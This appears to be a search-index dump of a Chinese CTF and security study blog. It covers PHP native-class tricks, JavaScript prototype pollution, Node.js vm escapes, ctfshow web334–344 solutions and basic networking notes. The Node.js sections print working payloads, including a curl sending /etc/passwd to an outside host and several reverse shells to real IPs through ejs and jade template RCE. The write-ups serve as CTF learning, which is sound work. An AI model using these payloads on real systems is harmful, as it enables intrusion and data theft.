&#x3D; 1; print_r($count); die(); &#125;else&#123; $a &#x3D; $_POST[&#39;a&#39;]; $b &#x3D; $_POST[&#39;b&#39;]; echo new $a($b); &#125; &#125; ?&gt; $flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;; 绕过第二个if判断是利用了数组溢出的原理 然后进入else语句 一般看到echo new $a($b)这种形式，就需要考虑利用php的原生类来遍历目录以及读取文件 报错类Error在PHP7版本中，因为Error中带有__toString方法，该方法会将传入给__toString的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。 a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 Exception与Error类似，Exception同样有__toString方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。 a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 遍历目录类DirectoryIteratorDirectoryIterator类的__construct方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项 返回了一个点，这个点代表这当前目录 如果要匹配其他文件，要利用glob协议 glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配 FilesystemIterator与DirectoryIterator类似，但实际使用时发现有些不同 GlobIterator无需加glob协议，因为这是自带的 读取文件类SplFileObject SplFileObject类为文件提供了一个面向对象接口 也就是说我们可以利用这个来读取文件，例如 a&#x3D;SplFileObject&amp;b&#x3D;flag.php 但是由于这个类返回的是迭代器，所以不能完整的读出文件，所以就要利用php://filter来将文件内容以全部输出 回到这道题我们可以利用 FilesystemIterator、DirectoryIterator或GlobIterator找到flag所在的目录，再用SplFileObject读出文件内容 但是这道题中flag文件并不叫flag.php而是flag.md5(???).php，所以我们要用通配符找到真正的flag文件， 在通配符中，？代表一个字符，但是必须存在，而*表示存在任意个字符，但是也包括零个，所以因为迭代器的性质，只加*就只能匹配到flag.php 但是如果我们用FilesystemIterator，我们可以直接加路径看到这个flag文件，不太理解为什么 接下来就是用SplFileObject读出来就然后base64解个码就行 原生类获取注释看见这个想起了去年国赛我唯一出了的一道题 &lt;?php highlight_file(__file__); class User &#123; private static $c &#x3D; 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; &#x2F;** * flag *&#x2F; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125; &#125; $rc&#x3D;$_GET[&quot;rc&quot;]; $rb&#x3D;$_GET[&quot;rb&quot;]; $ra&#x3D;$_GET[&quot;ra&quot;]; $rd&#x3D;$_GET[&quot;rd&quot;]; $method&#x3D; new $rc($ra, $rb); var_dump($method-&gt;$rd()); flag在注释里但并不会被显示出来，但是我们可以利用通过反射 ReflectionMethod 类来获取类方法的相关信息 ?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://ethe448.github.io/tags/web/"}]},{"title":"js漏洞","slug":"js漏洞","date":"2022-02-21T07:09:54.000Z","updated":"2022-03-28T08:22:29.361Z","comments":true,"path":"2022/02/21/js漏洞/","link":"","permalink":"https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"原型链污染深入了解JavaScript在JavaScript中，一切皆对象 当我们创建一个js对象如 var a &#x3D; &#123;&#125;; 它会拥有一些自带的属性，如 JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义： 这里test()函数的内容其实就是test类的构造函数 而constructor这个属性就是用于查看对象的构造函数 接下来我们要知道prototype和**_proto_**又是什么 从类的角度讲，prototype是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有__proto__出现，且一个对象的proto属性，指向这个对象所在的类的prototype属性。 这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。 对于a而言有个__proto__属性指向window.Object.prototype 这样你在调用a.toString() 的时候，a本身没有 toString，就去 a._proro_ 上面去找 toString。 所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString 对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show() 总结一下 prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法 一个对象的__proto__属性，指向这个对象所在的类的prototype属性 类在运行程序运行时是可以修改的 JavaScript的原型与原型链这种继承机制使得JavaScript中有原型和原型链的存在 原型 ①所有引用类型都有一个__proto__(隐式原型)属性，属性值是一个普通的对象②所有函数都有一个prototype(原型)属性，属性值是一个普通的对象③所有引用类型的__proto__属性指向它构造函数的prototype** 原型链 当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。 举例： 若有代码 function Parent(month)&#123; this.month &#x3D; month; &#125; var child &#x3D; new Parent(&#39;Ann&#39;); console.log(child.month); &#x2F;&#x2F; Ann console.log(child.father); &#x2F;&#x2F; undefined 则在child中查找某个属性时会 什么是原型链污染Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。 所以我们可以通过修改Object.prototype来实现对变量的修改 可以看到我们将a._proto_.bar 设置为2 新定义的变量也有了bar属性，且为2 那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 原型链污染的利用当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染 最显然的情况obj[a][b] &#x3D; value obj[a][b][c] &#x3D; value 如果控制了a,b,c及value就可以进行原型链污染的攻击, 可以控制a=__proto__ 利用特殊的api 对象merge 对象clone（其实内核就是将待操作的对象merge到一个空对象中） 例如 function merge(target, source) &#123; console.log(target[key], source[key]) for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125; &#125; 这时如果key是__proto__不就可以直接修改其原型了吗 但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。 只有经过JSON.parse解析,才能让__proto__代表了一个key 成功污染 参考文章： 深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com) 【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链 原型链污染漏洞(一)_lonmar的博客-CSDN博客 从杭电hgame-week4学原型链污染 - 简书 (jianshu.com) 三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com) JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客 node.js 沙盒逃逸背景在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。 对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。 它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 like： 读取文件： require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);; 反弹shell： q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;); 即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1 类eval函数： setInteval(some_function, 2000) setTimeout(some_function, 2000); 相当于匿名函数，即php当中create_function。 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。 在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用 vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。 也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息 这看起来是十分安全的方式 但在官网中有这样一段话vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。 也就是说，vm模块同样有被逃逸的风险 VM逃逸const vm &#x3D; require(&quot;vm&quot;); const ctx &#x3D; &#123;&#125;; vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx); console.log(&quot;Never gets executed.&quot;); 这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出 创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function 函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。 上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。 所以我们能够用process变量来做更多的东西 或者这样 参考文章 ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客 node.js 沙盒逃逸分析 - JavaShuo 你终于回来了(。・∀・)ノ (cnblogs.com) Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com) CTFSHOW nodejs部分web334 用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行 web335js的命令执行 可以使用chile_process.exec来间接调用/bash.sh。它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 exec因为返回值的问题没法利用 所以这里可以用execSync eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;) eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;) 或者spawnSync eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString() eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString() 还可以用global.process.mainModule.constructor._load替代require eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;) web336过滤了exec 但是可以用spawnSync 还可以利用fs模块文件操作 eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;); eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;); web337数组绕过，但是不同于php的数组绕过 var express &#x3D; require(&#39;express&#39;); var router &#x3D; express.Router(); var crypto &#x3D; require(&#39;crypto&#39;); function md5(s) &#123; return crypto.createHash(&#39;md5&#39;) .update(s) .digest(&#39;hex&#39;); &#125; &#x2F;* GET home page. *&#x2F; router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag&#x3D;&#39;xxxxxxx&#39;; var a &#x3D; req.query.a; var b &#x3D; req.query.b; if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;); &#125; &#125;); module.exports &#x3D; router; 传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同 js有个很奇怪的特性 不能直接比较两个数组 而且拼接字符串时也有个特性 也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag 而如果我们传入的是非数字索引，那么他就会变成js中的对象 对象的拼接又有这种特性 所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag web338common.js里有copy函数 猜测是原型链污染 看login.js 让secert的ctfshow属性等于36dboy {&quot;_proto_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}} 抓包之后改一下 web339非预期解：利用ejs模板rce漏洞 羽师傅的payload： &#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125; 反弹之前可以先关一下服务器的防火墙systemctl stop firewalld 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客 预期解： 登录部分 同样的copy函数 这里要求ctfshow=flag的内容，可我们并不知道flag 我们再看看api.js 如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作 但是这个是变量不是变量的属性，也能污染吗 答案是可以的 因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在 所以我们可以构造payload &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125; 然后访问一下api页面触发query web340登录部分 copy函数： 这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象 所以我们的payload为 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; 同样传入之后访问一下api页面就行 web341没有了api.js 所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125; web342-web343同样是模板引擎的rce，不过不是之前的ejs，而是jade 再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com) 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) ejs原型污染rce分析 - 先知社区 (aliyun.com) 用一个payload都能打 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; web344代码： router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag &#x3D; &#39;flag_here&#39;; if(req.url.match(&#x2F;8c|2c|\\,&#x2F;ig))&#123; res.end(&#39;where is flag :)&#39;); &#125; var query &#x3D; JSON.parse(req.query.query); if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123; res.end(flag); &#125;else&#123; res.end(&#39;where is flag. :)&#39;); &#125; &#125;); 如果没有过滤，那么我们直接传入 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; 就行，但是题目把逗号和他的url编码过滤了 这时就要尝试用&amp;绕过 nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析 所以最终payload为 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; 把c也编码的原因是防止和双引号的url编码构成%22c","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://ethe448.github.io/tags/web/"}]},{"title":"ict学习笔记","slug":"ict学习笔记","date":"2022-01-24T04:01:19.000Z","updated":"2022-03-28T08:22:24.242Z","comments":true,"path":"2022/01/24/ict学习笔记/","link":"","permalink":"https://ethe448.github.io/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"数据通信网络基础概念通信：人与人，人与物，物与物之间通过某种媒介和行为进行的信息传递与交流 网络通信：终端设备之间通过计算机网络进行的通信 信息传递过程 数据被打包成原始的数据载荷，并添加一定信息(目的地址)的头部和尾部形成报文(封装)，报文通过网线到达网关，网关对报文进行&quot;解封装&quot;，读取目的地址，再重新封装，根据不同的目的地址送往不同的路由器，报文由此离开本地网络，进入internet的干道进行传输，后进入目的地址所在的本地链路，由本地链路的网关或路由器再进行解封装和封装，并根据目的地址觉得发往相应的下一台路由器，最终到达目的计算机所在的网络的网关，再进行解封装和封装，根据目的地址发往相应的计算机。计算机收到报文后对其进行校验处理，校验无误后，接收报文，并将其中的数据载荷交由相应的应用程序进行处理。 常见术语 • 数据载荷：可以理解为最终想要传递的信息，但实际上，在具有层次化结构的通信过程中， 上一层协议传递给下一层协议的数据单元（报文）都可以称之为下一层协议的数据载荷。 • 报文：网络中交换与传输的数据单元，具有一定的内在格式，通常都具有头部+数据载荷+ 尾部的基本结构。传输过程中，报文的格式和内容可能发生改变。 • 头部：为了更好的传递信息，在组装报文时，在数据载荷的前面添加的信息段统称为报文 的头部。 • 尾部：为了更好的传递信息，在组装报文时，在数据载荷的后面添加的信息段统称为报文 的尾部。注意，很多报文是没有尾部的。 • 封装：分层协议所采用的一种技术，底层协议收到来自上层协议的消息时，将该消息附加 到底层帧的数据部分。 • 解封装：是封装的逆过程，也就是去掉报文的头部和尾部，获取数据载荷的过程。 • 网关：是在采用不同体系结构或协议的网络之间进行互通时，用于提供协议转换、路由选 择、数据交换等功能的网络设备。网关是一种根据其部署位置和功能而命名的术语，而不 是一种特定的设备类型。 • 路由器：为报文选择传递路径的网络设备。 • 终端设备：数据通信系统的端设备，作为数据的发送者或接收者，提供用户接入协议操作 所需必要功能，可以是计算机、服务器、VoIP、手机等。 基本概念数据通信网络：由路由器，交换机，防火墙，无线控制器，无线接入点，以及个人电脑，网络打印机，服务器等设备构成的通信网络。 功能：实现数据互通 网络设备交换机：距离终端用户最近的设备，用于终端用户接入网络、对数据帧进行交换 终端设备（pc，服务器等）的网络接入 二层交换 在园区网络中，交换机一般来说是距离终端用户最近的设备，接入层的交换机一般为 二层交换机，又称为以太网交换机，二层是指TCP/IP参考模型的数据链路层； 以太网交换机可以实现：数据帧的交换、终端用户设备的接入、基本的接入安全功能、 二层链路的冗余等； 广播域：一个节点发送一个广播报文其余节点都能够收到的节点的集合 路由器：网络层设备，可以在因特网中进行数据的转发 实现同类型网络或异种网络之间的通信 隔离广播域 维护路由表、运行路由协议 路径（路由信息）选择、IP报文的转发 广域网接入、网络地址转换 连接通过交换机组建的二层网络 路由器工作在TCP/IP参考模型的网络层； 路由器可以实现：维护路由表和路由信息、路由发现及路径 选择、数据转发、隔离广 播域、广域网接入和网络地址转换及特定的安全功能 防火墙：网络安全设备，用于控制两个网络之间的安全通信。通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现对网络的安全保护 隔离不同安全级别的网络 实现不同安全级别的网络之间的访问控制（安全策略） 用户身份认真 实现远程接入功能 实现数据加密及虚拟专用网业务 执行网络地址转换 其他安全功能 是位于两个信任程度不同的网络之间（如企业内部网络和Internet之间）的设备，它 对两个网络之间的通信进行控制，通过强制实施统一的安全策略，防止对重要信息资 源的非法存取和访问，以达到保护系统安全的目的。 无线网络： ​ 无线局域网WLAN广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中 的部分或全部传输介质所构成的网络。而常见的Wi-Fi是指IEEE 802.11标准上的无线局域网 技术。 ​ 在WLAN中，常见的设备有胖AP、瘦AP和无线控制器AC。 无线接入点 (AP, Access Point） ​ 一般支持FAT AP、FIT AP和云管理工作模式，根据网络规划的需求，可以灵活地在各种模式下切换。 ​ FAT AP：适用于家庭，独立工作，需单独配置，功能较为单一，成本低。 ​ FIT AP：适用于大中型企业，需要配合AC使用，由AC统一管理和配置，功能丰富。 ​ 云管理：适用于中小型企业，需要配合云管理平台使用，由云管理平台统一管理和配置，功能丰富，即插即用。 无线接入控制器 (AC, Access Controller) ​ 一般位于整个网络的汇聚层，提供高速、安全、可靠的WLAN业务。 ​ 提供大容量、高性能、高可靠性、易安装、易维护的无线数据控制业务，具有 组网灵活、绿色节能等优势 局域网、城域网、广域网局域网：覆盖范围在几公里之内。主要作用是把分布较近的若干终端电脑连接起来，使用以太网、wi-fi等技术 城域网：较大型的局域网，成本高，传输速率快。改进了局域网的传输介质，扩大了访问范围。主要作用是将同一城市内不同地点的主机、数据库以及局域网等连接起来；与广域网作用相似，但实现方式和性能不同。基于大型的局域网，与局域网技术相似，如：以太网 (10Gbps/100Gbps)、 WiMAX (全球互通微波访问) 广域网：覆盖范围一般在几公里以上，可大至几十、几百或几千公里。主要作用是把分布较远 (如: 跨越城市、跨越国家， 等等) 的若干局域网或城域 网连接起来；会用到电信运营商的通信线路。使用HDLC、PPP等技术 网络拓扑是指用传输介质（如双绞线、光纤等）互联各种设备所呈现的结构化布局。 形态 星型网络： 所有节点通过一个中心节点连接在一起。 优点：容易在网络中增加新的节点。通信数据必须经过中心节点中转，易于实现网络 监控。 缺点：中心节点的故障会影响到整个网络的通信。 总线型网络： 所有节点通过一条总线（如同轴电缆）连接在一起。 优点：安装简便，节省线缆。某一节点的故障一般不会影响到整个网络的通信。 缺点：总线故障会影响到整个网络的通信。某一节点发出的信息可以被所有其他节点 收到，安全性低。 环形网络： 所有节点连成一个封闭的环形。 优点：节省线缆。 缺点：增加新的节点比较麻烦，必须先中断原来的环，才能插入新节点以形成新环。 树形网络： 树型结构实际上是一种层次化的星型结构。 优点：能够快速将多个星型网络连接在一起，易于扩充网络规模。 缺点：层级越高的节点故障导致的网络问题越严重 全网状网络： 所有节点都通过线缆两两互联。 优点：具有高可靠性和高通信效率。 缺点：每个节点都需要大量的物理端口，同时还需要大量的互连线缆。成本高，不易 扩展。 部分网状网络： 只是重点节点之间才两两互连。 优点：成本低于全网状网络。 缺点：可靠性比全网状网络有所降低。 在实际组网中，通常都会根据成本、通信效率、可靠性等具体需求而采用多种拓扑形态相 结合的方法。 网络工程网络工程，就是围绕着网络进行的一系列的活动，包括：网络规划、设计、实施、调试、 排错等。 网络工程设计的知识领域很宽广，其中路由和交换是计算机网络的基本 网络工程师： 网络参考模型应用和数据应用：应用的存在是为了满足人们的各种需求，伴随着应用会有信息的产生。比如文本，图片，视频等都是信息的不同呈现方式 数据：数据是各种信息的载体，大部分应用程序所产生的数据需要在不同的设备之间传递。 • 计算机只能识别0和1的组成的电子数据(digital data)。它不具备读取各种信息的能力，所 以信息需要通过一定的规则翻译成数据。 • 而对人来说，我们不具备读取电子数据的能力，所以在读取信息的时候，需要将数据转成 人能理解的信息。 • 对于一名网络工程师来说，需要更关注数据的端到端传递的过程。 OSI参考模型 OSI 模型(Open Systems Interconnection Model)，由国际化标准组织ISO (The International Organization for Standardization ) 收录在ISO 7489标准中并于1984年发布。 OSI参考模型又被称为七层模型，由下至上依次为： 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 网络层：定义逻辑地址，供路由器确定路径，负责将数据从源网络传输到目的网络。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备 中的应用程序之间的服务请求和响应组成。 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的 数据能被另一个系统的应用层识别。 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。 TCP/IP参考模型 结构上与OSI模型类似，采用分层架构，同时层与层之间联系紧密。 TCP/IP标准参考模型将OSI中的数据链路层和物理层合并为网络接入层，这种划分方式其实 是有悖于现实协议制定情况的，故融合了TCP/IP标准模型和OSI模型的TCP/IP对等模型被提出 TCP/IP常见协议 应用层 HTTP（Hypertext Transfer Protocol，超文本传输协议）：用来访问在网页服务器上 的各种页面。 FTP（File Transfer Protocol，文件传输协议）：为文件传输提供了途径，它允许数据从一台主机传送到另一台主机上，用于文件的下载和上传，采用C/S（Client/Server）结构。 DNS（Domain Name Service，域名称解析服务）：用于实现从主机域名到IP地址之 间的转换。 Telnet：是数据网络中提供远程登录服务的标准协议。Telnet为用户提供了在本地计算机上完成远程设备工作的能力。 传输层 TCP （Transmission Control Protocol，传输控制协议） ：为应用程序提供可靠的面向连接的通信服务。目前，许多流行的应用程序都使用TCP。 UDP（User Datagram Protocol，用户数据报协议）：提供了无连接通信，且不对传 送数据包进行可靠性的保证。 网络层 IP（Internet Protocol，互联网协议）：将传输层的数据封装成数据包并完成源站点 到目的站点的转发，提供无连接的、不可靠的服务。 IGMP（Internet Group Management Protocol，因特网组管理协议）：负责IP组播 成员管理的协议。它用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播 组成员关系。 ICMP（Internet Control Message Protocol，网际报文控制协议）：基于IP协议在网 络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。通过这些信息，使 管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。 数据链路层 PPP（Point-to-Point Protocol，点对点协议）：一种点对点模式的数据链路层协议， 多用于广域网。 Ethernet( 以太网协议 )：一种多路访问广播型数据链路层协议，是当前应用最为广 泛的局域网技术。 PPPoE（Point-to-Point Protocol over Ethernet，以太网承载PPP协议）：PPPoE提 供通过简单桥接访问设备（接入设备）把一个网络的多个主机连接到远程访问集中器 的功能。常见的应用有家庭宽带拨号上网。 常见协议标准化组织IETF：负责开发和推广互联网协议（特别是TCP/IP协议族的协议）的志愿组织 IEEE：制定了全世界电子，电气和计算机科学领域30%左右的标准，如IEEE802.3（Ethernet）、IEEE802.11（WiFi）等。 ISO：指定计算机网络标准，如OSI模型 应用层应用层为应用软件提供接口，使应用程序能够使用网络服务。应用层协议会指定使用相应的传输层协议，以及传输层所使用的端口等。 应用层的PDU被称为Data（数据）。 TCP/IP每一层都让数据得以通过网络进行传输，这些层之间使用PDU（Packet Data Unit， 协议数据单元）彼此交换信息，确保网络设备之间能够通信。 不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称 FTP: FTP客户端提供本地设备对远程服务器的文件进行操作的命令，用户在PC上通过应用程序作为FTP Client，并与FTP服务器建立连接后，可以对FTP Server上的文件进行操作 FTP服务器是运行FTP服务的设备，提供远程客户端访问和操作的功能，用户可以通过FTP客户端程序登录到服务器上，访问设备上的文件。 Telnet： 用户通过Telnet客户端程序连接到Telnet服务器。用户在Telnet客户端中输入命令，这些命令会在服务器端运行，就像直接在服务端的控制台输入一样 传输层传输层协议接收来自应用层的数据baoz，封装上相应的传输层头部，帮助其建立“端到端”的连接。 传输层的PDU被称为Segment（段）。 TCP和UDP报文格式 TCP报文头部： Source Port：源端口，标识哪个应用程序发送。长度为16比特。 Destination Port：目的端口，标识哪个应用程序接收。长度为16比特。 Sequence Number：序号字段。TCP链接中传输的数据流每个字节都编上一个序号。 序号字段的值指的是本报文段所发送数据的第一个字节的序号。长度为32比特。 Acknowledgment Number：确认序列号，是期望收到对方下一个报文段数据的第1 个字节的序号，即上次已成功接收到的数据段的最后一个字节数据的序号加1。只有 Ack标识为1，此字段有效。长度为32比特。 Header Length：头部长度，指出TCP报文头部长度，以32比特（4字节）为计算单位。 若无选项内容，则该字段为5，即头部为20字节。 Reserved：保留，必须填0。长度为6比特。 Control bits：控制位，包含FIN、ACK、SYN等标志位，代表不同状态下的TCP数据 段。 Window：窗口TCP的流量控制，这个值表明当前接收端可接受的最大的数据总数 （以字节为单位）。窗口最大为65535字节。长度为16比特。 Checksum：校验字段，是一个强制性的字段，由发端计算和存储，并由收端进行验 证。在计算检验和时，要包括TCP头部和TCP数据，同时在TCP报文段的前面加上12 字节的伪头部。长度为16比特。 Urgent:紧急指针，只有当URG标志置1时紧急指针才有效。TCP的紧急方式是发送端 向另一端发送紧急数据的一种方式。紧急指针指出在本报文段中紧急数据共有多少个 字节（紧急数据放在本报文段数据的最前面）。长度为16比特。 Options：选项字段（可选），长度为0-40字节。 UDP报文头部 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 